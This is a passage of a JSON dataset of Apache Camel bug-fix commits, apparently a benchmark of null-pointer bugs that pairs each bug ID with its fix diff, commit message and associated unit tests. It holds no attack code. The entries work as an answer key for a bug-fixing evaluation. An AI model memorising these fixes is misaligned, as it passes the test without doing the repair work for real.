get the InputStream rightly.\n+                        exchange.getOut().setBody(is);\n+                    }\n+                    \n+                });\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/2c5e3167c21e29c752a7b4b38be4a80850f1e169/tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/JaxbFallbackTypeConverterTest.java",
                "sha": "cc3e980b1850ce6333f8805502a1293adced77d0",
                "status": "added"
            },
            {
                "additions": 52,
                "blob_url": "https://github.com/apache/camel/blob/2c5e3167c21e29c752a7b4b38be4a80850f1e169/tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/example/Bar.java",
                "changes": 52,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/example/Bar.java?ref=2c5e3167c21e29c752a7b4b38be4a80850f1e169",
                "deletions": 0,
                "filename": "tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/example/Bar.java",
                "patch": "@@ -0,0 +1,52 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.itest.jaxb.example;\n+\n+import javax.xml.bind.annotation.XmlAccessType;\n+import javax.xml.bind.annotation.XmlAccessorType;\n+import javax.xml.bind.annotation.XmlAttribute;\n+import javax.xml.bind.annotation.XmlRootElement;\n+\n+@XmlRootElement\n+@XmlAccessorType(XmlAccessType.FIELD)\n+public class Bar {\n+    \n+    @XmlAttribute\n+    private String name;\n+    @XmlAttribute\n+    private String value;\n+    \n+    public Bar() {\n+    }\n+    \n+    public void setName(String name) {\n+        this.name = name;\n+    }\n+    \n+    public void setValue(String value) {\n+        this.value = value;\n+    }\n+    \n+    public String getName() {\n+        return name;\n+    }\n+    \n+    public String getValue() {\n+        return value;\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/2c5e3167c21e29c752a7b4b38be4a80850f1e169/tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/example/Bar.java",
                "sha": "4e511b62ff763f5381323fe606faa2b6bee3db7f",
                "status": "added"
            }
        ],
        "message": "CAMEL-5890 fixed the NPE when jaxb fallbackConverter is used with RequestEntityConverter\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1423299 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/07cedff5838644ac5a7b82da21e1247ca5db0e61",
        "patched_files": [
            "FallbackTypeConverter.java",
            "RequestEntityConverter.java",
            "Bar.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JaxbFallbackTypeConverterTest.java"
        ]
    },
    "camel_2ddca93": {
        "bug_id": "camel_2ddca93",
        "commit": "https://github.com/apache/camel/commit/2ddca935c9bebf5e29ddde53683eec08879b6f18",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/2ddca935c9bebf5e29ddde53683eec08879b6f18/components/camel-jt400/src/main/java/org/apache/camel/component/jt400/Jt400DataQueueConsumer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jt400/src/main/java/org/apache/camel/component/jt400/Jt400DataQueueConsumer.java?ref=2ddca935c9bebf5e29ddde53683eec08879b6f18",
                "deletions": 0,
                "filename": "components/camel-jt400/src/main/java/org/apache/camel/component/jt400/Jt400DataQueueConsumer.java",
                "patch": "@@ -108,6 +108,7 @@ private Exchange receive(DataQueue queue, long timeout) throws Exception {\n         }\n \n         Exchange exchange = new DefaultExchange(endpoint.getCamelContext());\n+        exchange.setFromEndpoint(endpoint);\n         if (entry != null) {\n             exchange.getIn().setHeader(Jt400Endpoint.SENDER_INFORMATION, entry.getSenderInformation());\n             if (endpoint.getFormat() == Jt400Configuration.Format.binary) {\n@@ -134,6 +135,7 @@ private Exchange receive(KeyedDataQueue queue, long timeout) throws Exception {\n         }\n \n         Exchange exchange = new DefaultExchange(endpoint.getCamelContext());\n+        exchange.setFromEndpoint(endpoint);\n         if (entry != null) {\n             exchange.getIn().setHeader(Jt400Endpoint.SENDER_INFORMATION, entry.getSenderInformation());\n             if (endpoint.getFormat() == Jt400Configuration.Format.binary) {",
                "raw_url": "https://github.com/apache/camel/raw/2ddca935c9bebf5e29ddde53683eec08879b6f18/components/camel-jt400/src/main/java/org/apache/camel/component/jt400/Jt400DataQueueConsumer.java",
                "sha": "825af3cde13f1c4353856db7eaa706687683bb1f",
                "status": "modified"
            }
        ],
        "message": "Added set of fromEndpoint in producing exchanges to prevent a NPE using the component through camel uri binding in switchyard",
        "parent": "https://github.com/apache/camel/commit/75b813aedee88e170a4f76f729a2ecd732a2d9c8",
        "patched_files": [
            "Jt400DataQueueConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "Jt400DataQueueConsumerTest.java"
        ]
    },
    "camel_2f66cda": {
        "bug_id": "camel_2f66cda",
        "commit": "https://github.com/apache/camel/commit/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d",
        "file": [
            {
                "additions": 20,
                "blob_url": "https://github.com/apache/camel/blob/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "changes": 24,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java?ref=2f66cdaa1c062ef99be9bfaf91c93069c671bc3d",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "patch": "@@ -266,32 +266,48 @@ protected MethodInfo createMethodInfo(Class clazz, Method method) {\n \n         boolean hasCustomAnnotation = false;\n         boolean hasHandlerAnnotation = ObjectHelper.hasAnnotation(method.getAnnotations(), Handler.class);\n-        for (int i = 0; i < parameterTypes.length; i++) {\n+\n+        int size = parameterTypes.length;\n+        if (LOG.isTraceEnabled()) {\n+            LOG.trace(\"Creating MethodInfo for class: \" + clazz + \" method: \" + method + \" having \" + size + \" parameters\");\n+        }\n+\n+        for (int i = 0; i < size; i++) {\n             Class parameterType = parameterTypes[i];\n             Annotation[] parameterAnnotations = parametersAnnotations[i];\n             Expression expression = createParameterUnmarshalExpression(clazz, method, parameterType, parameterAnnotations);\n             hasCustomAnnotation |= expression != null;\n \n             ParameterInfo parameterInfo = new ParameterInfo(i, parameterType, parameterAnnotations, expression);\n             parameters.add(parameterInfo);\n-\n             if (expression == null) {\n-                hasCustomAnnotation |= ObjectHelper.hasAnnotation(parameterAnnotations, Body.class);\n+                boolean bodyAnnotation = ObjectHelper.hasAnnotation(parameterAnnotations, Body.class);\n+                if (LOG.isTraceEnabled() && bodyAnnotation) {\n+                    LOG.trace(\"Parameter #\" + i + \" has @Body annotation\");\n+                }\n+                hasCustomAnnotation |= bodyAnnotation;\n                 if (bodyParameters.isEmpty()) {\n+                    // okay we have not yet set the body parameter and we have found\n+                    // the candidate now to use as body parameter\n                     if (Exchange.class.isAssignableFrom(parameterType)) {\n                         // use exchange\n                         expression = ExpressionBuilder.exchangeExpression();\n                     } else {\n                         // lets assume its the body\n                         expression = ExpressionBuilder.bodyExpression(parameterType);\n                     }\n+                    if (LOG.isTraceEnabled()) {\n+                        LOG.trace(\"Parameter #\" + i + \" is the body parameter using expression \" + expression);\n+                    }\n                     parameterInfo.setExpression(expression);\n                     bodyParameters.add(parameterInfo);\n                 } else {\n                     // will ignore the expression for parameter evaluation\n                 }\n             }\n-\n+            if (LOG.isTraceEnabled()) {\n+                LOG.trace(\"Parameter #\" + i + \" has parameter info: \" + parameterInfo);\n+            }\n         }\n \n         // now lets add the method to the repository",
                "raw_url": "https://github.com/apache/camel/raw/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "sha": "4a1570b8379dd1be9580a6c1b76289780191ced6",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d/camel-core/src/main/java/org/apache/camel/component/bean/MethodInfo.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/bean/MethodInfo.java?ref=2f66cdaa1c062ef99be9bfaf91c93069c671bc3d",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/component/bean/MethodInfo.java",
                "patch": "@@ -29,7 +29,6 @@\n import org.apache.camel.ExchangePattern;\n import org.apache.camel.Expression;\n import org.apache.camel.Pattern;\n-import org.apache.camel.impl.ExpressionAdapter;\n import org.apache.camel.processor.RecipientList;\n import org.apache.camel.util.ObjectHelper;\n import org.apache.commons.logging.Log;\n@@ -174,12 +173,18 @@ protected Object invoke(Method mth, Object pojo, Object[] arguments, Exchange ex\n     }\n \n     protected Expression createParametersExpression() {\n-        // TODO: better check for size / parameters do not match up -> NPE\n         final int size = parameters.size();\n+        if (LOG.isTraceEnabled()) {\n+            LOG.trace(\"Creating parameters expression for \" + size + \" parameters\");\n+        }\n+\n         final Expression[] expressions = new Expression[size];\n         for (int i = 0; i < size; i++) {\n             Expression parameterExpression = parameters.get(i).getExpression();\n             expressions[i] = parameterExpression;\n+            if (LOG.isTraceEnabled()) {\n+                LOG.trace(\"Parameter #\" + i + \" has expression: \" + parameterExpression);\n+            }\n         }\n         return new Expression() {\n             @SuppressWarnings(\"unchecked\")\n@@ -195,7 +200,13 @@ protected Expression createParametersExpression() {\n                     if (multiParameterArray) {\n                         value = ((Object[])body)[i];\n                     } else {\n-                        value = expressions[i].evaluate(exchange, parameters.get(i).getType());\n+                        Expression expression = expressions[i];\n+                        if (expression != null) {\n+                            value = expression.evaluate(exchange, parameters.get(i).getType());\n+                            if (LOG.isTraceEnabled()) {\n+                                LOG.trace(\"Parameter #\" + i + \" evaluated as: \" + value + \" type: \" + ObjectHelper.type(value));\n+                            }\n+                        }\n                     }\n                     // now lets try to coerce the value to the required type\n                     answer[i] = value;",
                "raw_url": "https://github.com/apache/camel/raw/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d/camel-core/src/main/java/org/apache/camel/component/bean/MethodInfo.java",
                "sha": "3d4d1c209d6c9b154edb805baf1d7e203ca25e99",
                "status": "modified"
            },
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d/camel-core/src/main/java/org/apache/camel/component/bean/ParameterInfo.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/bean/ParameterInfo.java?ref=2f66cdaa1c062ef99be9bfaf91c93069c671bc3d",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/component/bean/ParameterInfo.java",
                "patch": "@@ -17,6 +17,7 @@\n package org.apache.camel.component.bean;\n \n import java.lang.annotation.Annotation;\n+import java.util.Arrays;\n \n import org.apache.camel.Expression;\n \n@@ -57,4 +58,16 @@ public Class getType() {\n     public void setExpression(Expression expression) {\n         this.expression = expression;\n     }\n+\n+    @Override\n+    public String toString() {\n+        final StringBuilder sb = new StringBuilder();\n+        sb.append(\"ParameterInfo\");\n+        sb.append(\"[index=\").append(index);\n+        sb.append(\", type=\").append(type);\n+        sb.append(\", annotations=\").append(annotations == null ? \"null\" : Arrays.asList(annotations).toString());\n+        sb.append(\", expression=\").append(expression);\n+        sb.append(']');\n+        return sb.toString();\n+    }\n }",
                "raw_url": "https://github.com/apache/camel/raw/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d/camel-core/src/main/java/org/apache/camel/component/bean/ParameterInfo.java",
                "sha": "718fff1213331bcfccd8a882485f9ad6a31a0a6d",
                "status": "modified"
            }
        ],
        "message": "Added TRACE logging for bean component for inspection method to invoke for bean parameter binding. To aid when having problems. Fixed a NPE also.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@782977 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/8213d7f49fb4a6e88972010d6f1ddeb345689748",
        "patched_files": [
            "BeanInfo.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "BeanInfoTest.java"
        ]
    },
    "camel_2fe5d2a": {
        "bug_id": "camel_2fe5d2a",
        "commit": "https://github.com/apache/camel/commit/2fe5d2acaf9f3d1b1c91001007645364f6dbfd90",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/2fe5d2acaf9f3d1b1c91001007645364f6dbfd90/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java?ref=2fe5d2acaf9f3d1b1c91001007645364f6dbfd90",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "patch": "@@ -356,7 +356,7 @@ public static Boolean parseBoolean(CamelContext camelContext, String text) throw\n     public static SortedMap<String, Properties> findComponents(CamelContext camelContext) throws LoadPropertiesException {\n         SortedMap<String, Properties> map = new TreeMap<String, Properties>();\n         Enumeration<URL> iter = camelContext.getClassResolver().loadResourcesAsURL(COMPONENT_DESCRIPTOR);\n-        while (iter.hasMoreElements()) {\n+        while (iter != null && iter.hasMoreElements()) {\n             URL url = iter.nextElement();\n             try {\n                 Properties properties = new Properties();",
                "raw_url": "https://github.com/apache/camel/raw/2fe5d2acaf9f3d1b1c91001007645364f6dbfd90/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "sha": "03b54221bfd2505b02ad670670c72b465202c237",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/f57c78f100482592b36bf6f06c9e5c703e5c751d",
        "patched_files": [
            "CamelContextHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelContextHelperTest.java"
        ]
    },
    "camel_337a675": {
        "bug_id": "camel_337a675",
        "commit": "https://github.com/apache/camel/commit/337a6756480354afea7531a1a4216de9d232f211",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/337a6756480354afea7531a1a4216de9d232f211/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java?ref=337a6756480354afea7531a1a4216de9d232f211",
                "deletions": 0,
                "filename": "components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "patch": "@@ -73,6 +73,10 @@ private Object invokeFunction(Method method,\n     }\n \n     Object mapCustom(Object source) {\n+        if (source == null) {\n+            return null;\n+        }\n+\n         // The converter parameter is stored in a thread local variable, so\n         // we need to parse the parameter on each invocation\n         // ex: custom-converter-param=\"org.example.MyMapping,map\"",
                "raw_url": "https://github.com/apache/camel/raw/337a6756480354afea7531a1a4216de9d232f211/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "sha": "72bc783df3fe85f0991ddbdc49017d67804b8976",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9710: Avoid NPE as the class is mandatory",
        "parent": "https://github.com/apache/camel/commit/927bb8a4ce19d72c016a4653bc5e93dd4ab61102",
        "patched_files": [
            "CustomMapper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CustomMapperTest.java"
        ]
    },
    "camel_353eeef": {
        "bug_id": "camel_353eeef",
        "commit": "https://github.com/apache/camel/commit/353eeefb6c4fb30d9da57c9050fd031031c95832",
        "file": [
            {
                "additions": 37,
                "blob_url": "https://github.com/apache/camel/blob/353eeefb6c4fb30d9da57c9050fd031031c95832/camel-core/src/main/java/org/apache/camel/component/log/LogEndpoint.java",
                "changes": 60,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/log/LogEndpoint.java?ref=353eeefb6c4fb30d9da57c9050fd031031c95832",
                "deletions": 23,
                "filename": "camel-core/src/main/java/org/apache/camel/component/log/LogEndpoint.java",
                "patch": "@@ -78,28 +78,7 @@ public LogEndpoint(String endpointUri, Component component, Processor logger) {\n     @Override\n     protected void doStart() throws Exception {\n         if (logger == null) {\n-            // setup a new logger here\n-            CamelLogger camelLogger;\n-            LoggingLevel loggingLevel = LoggingLevel.INFO;\n-            if (level != null) {\n-                loggingLevel = LoggingLevel.valueOf(level);\n-            }\n-            if (providedLogger == null) {\n-                camelLogger = new CamelLogger(loggerName, loggingLevel, getMarker());\n-            } else {\n-                camelLogger = new CamelLogger(providedLogger, loggingLevel, getMarker());\n-            }\n-            if (getGroupSize() != null) {\n-                logger = new ThroughputLogger(camelLogger, getGroupSize());\n-            } else if (getGroupInterval() != null) {\n-                Boolean groupActiveOnly = getGroupActiveOnly() != null ? getGroupActiveOnly() : Boolean.TRUE;\n-                Long groupDelay = getGroupDelay();\n-                logger = new ThroughputLogger(camelLogger, this.getCamelContext(), getGroupInterval(), groupDelay, groupActiveOnly);\n-            } else {\n-                logger = new CamelLogProcessor(camelLogger, localFormatter);\n-            }\n-            // the logger is the processor\n-            setProcessor(this.logger);\n+            logger = createLogger();\n         }\n         ServiceHelper.startService(logger);\n     }\n@@ -121,14 +100,49 @@ public Processor getLogger() {\n \n     @Override\n     public Producer createProducer() throws Exception {\n-        return new LogProducer(this, this.logger);\n+        // ensure logger is created and started first\n+        if (logger == null) {\n+            logger = createLogger();\n+        }\n+        ServiceHelper.startService(logger);\n+        return new LogProducer(this, logger);\n     }\n \n     @Override\n     protected String createEndpointUri() {\n         return \"log:\" + logger.toString();\n     }\n \n+    /**\n+     * Creates the logger {@link Processor} to be used.\n+     */\n+    protected Processor createLogger() throws Exception {\n+        Processor answer;\n+        // setup a new logger here\n+        CamelLogger camelLogger;\n+        LoggingLevel loggingLevel = LoggingLevel.INFO;\n+        if (level != null) {\n+            loggingLevel = LoggingLevel.valueOf(level);\n+        }\n+        if (providedLogger == null) {\n+            camelLogger = new CamelLogger(loggerName, loggingLevel, getMarker());\n+        } else {\n+            camelLogger = new CamelLogger(providedLogger, loggingLevel, getMarker());\n+        }\n+        if (getGroupSize() != null) {\n+            answer = new ThroughputLogger(camelLogger, getGroupSize());\n+        } else if (getGroupInterval() != null) {\n+            Boolean groupActiveOnly = getGroupActiveOnly() != null ? getGroupActiveOnly() : Boolean.TRUE;\n+            Long groupDelay = getGroupDelay();\n+            answer = new ThroughputLogger(camelLogger, this.getCamelContext(), getGroupInterval(), groupDelay, groupActiveOnly);\n+        } else {\n+            answer = new CamelLogProcessor(camelLogger, localFormatter);\n+        }\n+        // the logger is the processor\n+        setProcessor(answer);\n+        return answer;\n+    }\n+\n     /**\n      * Logging level to use.\n      * <p/>",
                "raw_url": "https://github.com/apache/camel/raw/353eeefb6c4fb30d9da57c9050fd031031c95832/camel-core/src/main/java/org/apache/camel/component/log/LogEndpoint.java",
                "sha": "0dc3205e6ec02be54d64b09d01bb7614e7fdbb00",
                "status": "modified"
            },
            {
                "additions": 47,
                "blob_url": "https://github.com/apache/camel/blob/353eeefb6c4fb30d9da57c9050fd031031c95832/camel-core/src/test/java/org/apache/camel/processor/LogPropertiesTest.java",
                "changes": 47,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/LogPropertiesTest.java?ref=353eeefb6c4fb30d9da57c9050fd031031c95832",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/LogPropertiesTest.java",
                "patch": "@@ -0,0 +1,47 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.processor;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+/**\n+ * @version \n+ */\n+public class LogPropertiesTest extends ContextTestSupport {\n+\n+    public void testLogProperties() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(1);\n+\n+        template.sendBody(\"direct:start\", \"Hello World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .to(\"properties:dude?locations=org/apache/camel/processor/foo.properties\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/353eeefb6c4fb30d9da57c9050fd031031c95832/camel-core/src/test/java/org/apache/camel/processor/LogPropertiesTest.java",
                "sha": "7bd02f2cf841f9bf863254f11ef5f10137d203a8",
                "status": "added"
            },
            {
                "additions": 18,
                "blob_url": "https://github.com/apache/camel/blob/353eeefb6c4fb30d9da57c9050fd031031c95832/camel-core/src/test/resources/org/apache/camel/processor/foo.properties",
                "changes": 18,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/resources/org/apache/camel/processor/foo.properties?ref=353eeefb6c4fb30d9da57c9050fd031031c95832",
                "deletions": 0,
                "filename": "camel-core/src/test/resources/org/apache/camel/processor/foo.properties",
                "patch": "@@ -0,0 +1,18 @@\n+## ---------------------------------------------------------------------------\n+## Licensed to the Apache Software Foundation (ASF) under one or more\n+## contributor license agreements.  See the NOTICE file distributed with\n+## this work for additional information regarding copyright ownership.\n+## The ASF licenses this file to You under the Apache License, Version 2.0\n+## (the \"License\"); you may not use this file except in compliance with\n+## the License.  You may obtain a copy of the License at\n+##\n+## http://www.apache.org/licenses/LICENSE-2.0\n+##\n+## Unless required by applicable law or agreed to in writing, software\n+## distributed under the License is distributed on an \"AS IS\" BASIS,\n+## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+## See the License for the specific language governing permissions and\n+## limitations under the License.\n+## ---------------------------------------------------------------------------\n+\n+dude=log:dude\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/353eeefb6c4fb30d9da57c9050fd031031c95832/camel-core/src/test/resources/org/apache/camel/processor/foo.properties",
                "sha": "3e85c8f0e4415cbfc06ce012cffc3d189545b13c",
                "status": "added"
            }
        ],
        "message": "CAMEL-10741: Fixed NPE in log component if created the endpoint from properties component. Thanks to David Martin for test case and reporting.",
        "parent": "https://github.com/apache/camel/commit/c5570fb1730c0552370a605ec6fbeb1df1618765",
        "patched_files": [
            "LogEndpoint.java",
            "foo.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "LogPropertiesTest.java",
            "LogEndpointTest.java"
        ]
    },
    "camel_36e7b66": {
        "bug_id": "camel_36e7b66",
        "commit": "https://github.com/apache/camel/commit/36e7b6681f8817a2b3baf0a30bd82ec14789b32a",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java",
                "changes": 14,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java?ref=36e7b6681f8817a2b3baf0a30bd82ec14789b32a",
                "deletions": 9,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java",
                "patch": "@@ -22,6 +22,7 @@\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.CamelContextAware;\n+import org.apache.camel.Component;\n import org.apache.camel.Consume;\n import org.apache.camel.Consumer;\n import org.apache.camel.ConsumerTemplate;\n@@ -37,7 +38,6 @@\n import org.apache.camel.component.bean.BeanInfo;\n import org.apache.camel.component.bean.BeanProcessor;\n import org.apache.camel.component.bean.ProxyHelper;\n-import org.apache.camel.component.properties.PropertiesComponent;\n import org.apache.camel.processor.CamelInternalProcessor;\n import org.apache.camel.processor.UnitOfWorkProducer;\n import org.apache.camel.util.CamelContextHelper;\n@@ -227,17 +227,13 @@ public Object getInjectionValue(Class<?> type, String endpointUri, String endpoi\n     public Object getInjectionPropertyValue(Class<?> type, String propertyName, String propertyDefaultValue,\n                                             String injectionPointName, Object bean, String beanName) {\n         try {\n+            // enforce a properties component to be created if none existed\n+            CamelContextHelper.lookupPropertiesComponent(getCamelContext(), true);\n+\n             String key;\n             String prefix = getCamelContext().getPropertyPrefixToken();\n             String suffix = getCamelContext().getPropertySuffixToken();\n-\n-            if (prefix == null && suffix == null) {\n-                // if no custom prefix/suffix then use defaults\n-                prefix = PropertiesComponent.DEFAULT_PREFIX_TOKEN;\n-                suffix = PropertiesComponent.DEFAULT_SUFFIX_TOKEN;\n-            }\n-\n-            if (!propertyName.startsWith(prefix)) {\n+            if (!propertyName.contains(prefix)) {\n                 // must enclose the property name with prefix/suffix to have it resolved\n                 key = prefix + propertyName + suffix;\n             } else {",
                "raw_url": "https://github.com/apache/camel/raw/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java",
                "sha": "817a2f969c0ff96b5e9990062255c9198b30d676",
                "status": "modified"
            },
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 36,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=36e7b6681f8817a2b3baf0a30bd82ec14789b32a",
                "deletions": 28,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -37,7 +37,6 @@\n import java.util.concurrent.ScheduledExecutorService;\n import java.util.concurrent.TimeUnit;\n import java.util.concurrent.atomic.AtomicInteger;\n-\n import javax.naming.Context;\n import javax.xml.bind.JAXBContext;\n import javax.xml.bind.Unmarshaller;\n@@ -1458,23 +1457,8 @@ public String resolvePropertyPlaceholders(String text) throws Exception {\n         if (text != null && !text.startsWith(\"properties:\")) {\n             // No component, assume default tokens.\n             if (pc == null && text.contains(PropertiesComponent.DEFAULT_PREFIX_TOKEN)) {\n-\n-                // try to lookup component, as we may be initializing CamelContext itself\n-                Component existing = lookupPropertiesComponent();\n-                if (existing != null) {\n-                    if (existing instanceof PropertiesComponent) {\n-                        pc = (PropertiesComponent) existing;\n-                    } else {\n-                        // properties component must be expected type\n-                        throw new IllegalArgumentException(\"Found properties component of type: \" + existing.getClass() + \" instead of expected: \" + PropertiesComponent.class);\n-                    }\n-                }\n-\n-                if (pc == null) {\n-                    // create a default properties component to be used as there may be default values we can use\n-                    log.info(\"No existing PropertiesComponent has been configured, creating a new default PropertiesComponent with name: properties\");\n-                    pc = getComponent(\"properties\", PropertiesComponent.class);\n-                }\n+                // lookup existing properties component, or force create a new default component\n+                pc = (PropertiesComponent) CamelContextHelper.lookupPropertiesComponent(this, true);\n             }\n \n             if (pc != null && text.contains(pc.getPrefixToken())) {\n@@ -2111,7 +2095,7 @@ private void doStartCamel() throws Exception {\n \n         // eager lookup any configured properties component to avoid subsequent lookup attempts which may impact performance\n         // due we use properties component for property placeholder resolution at runtime\n-        Component existing = lookupPropertiesComponent();\n+        Component existing = CamelContextHelper.lookupPropertiesComponent(this, false);\n         if (existing != null) {\n             // store reference to the existing properties component\n             if (existing instanceof PropertiesComponent) {\n@@ -3075,16 +3059,12 @@ public DataFormatDefinition resolveDataFormatDefinition(String name) {\n         }\n     }\n \n+    /**\n+     * @deprecated use {@link org.apache.camel.util.CamelContextHelper#lookupPropertiesComponent(org.apache.camel.CamelContext, boolean)}\n+     */\n+    @Deprecated\n     protected Component lookupPropertiesComponent() {\n-        // no existing properties component so lookup and add as component if possible\n-        PropertiesComponent answer = (PropertiesComponent) hasComponent(\"properties\");\n-        if (answer == null) {\n-            answer = getRegistry().lookupByNameAndType(\"properties\", PropertiesComponent.class);\n-            if (answer != null) {\n-                addComponent(\"properties\", answer);\n-            }\n-        }\n-        return answer;\n+        return CamelContextHelper.lookupPropertiesComponent(this, false);\n     }\n \n     public ShutdownStrategy getShutdownStrategy() {",
                "raw_url": "https://github.com/apache/camel/raw/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "7eb7fe6285e57551b832432a5ad946eee1130026",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/model/ProcessorDefinitionHelper.java",
                "changes": 4,
